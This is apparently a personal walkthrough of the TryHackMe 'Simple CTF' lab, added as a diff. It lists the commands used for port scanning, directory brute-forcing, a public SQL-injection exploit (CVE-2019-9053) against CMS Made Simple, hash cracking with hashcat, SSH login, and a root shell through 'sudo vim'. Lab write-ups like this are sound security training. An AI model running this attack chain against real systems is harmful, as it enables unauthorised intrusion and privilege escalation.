@@ -1,0 +1,37 @@
+Scaning
+nmap -A -p 21,80,2222 -T4 10.10.142.16
+
+Access port 21 to read the Mitch.txt
+
+
+Look for hidden file + dir on HTTP port
+quick (not recursive)
+gobuster dir -w ~/Desktop/THM/Simple\ CTF/common-web-content.txt -u http://10.10.142.16/ -x txt,py,php,sh -t 20
+slow (recursive for inside dir)
+dirb http://10.10.142.16/ /usr/share/wordlists/dirb/common.txt
+
+=> found /simple/ => is CMS made simple version 2.2.8 => google for exploit
+=> CVE-2019-9053
+=> download the script from exploit-db "https://www.exploit-db.com/exploits/46635"
+     an exploit that can perform a blind, time-based SQL injection through the m1_idlist parameter (By measuring how long the server takes to respond, the attacker can infer information character by character — even though they don’t see it directly.)
+=> run it with the best110.txt password list 
+=> got hased password and salt for mitch
+
+	[+] Salt for password found: ****************
+	[+] Username found: *****
+	[+] Email found: ***************
+	[+] Password found: ********************************
+
+Using hashcat to crack
+-m 20 hash:salt /usr/share/wordlists/best110.txt
+=> receive password: hash:salt:secret 
+
+ssh to the user (-p 2222)
+read the user.txt to get the user flag
+
+cd .. to see other user
+
+sudo -l to check if any command can execute => found vim => search on GTFObin for the execute privilege shell
+sudo vim -c ":!/bin/sh"
+use whoiam & id to check user ID => is root
+cd .. => cd root => cat root.txt
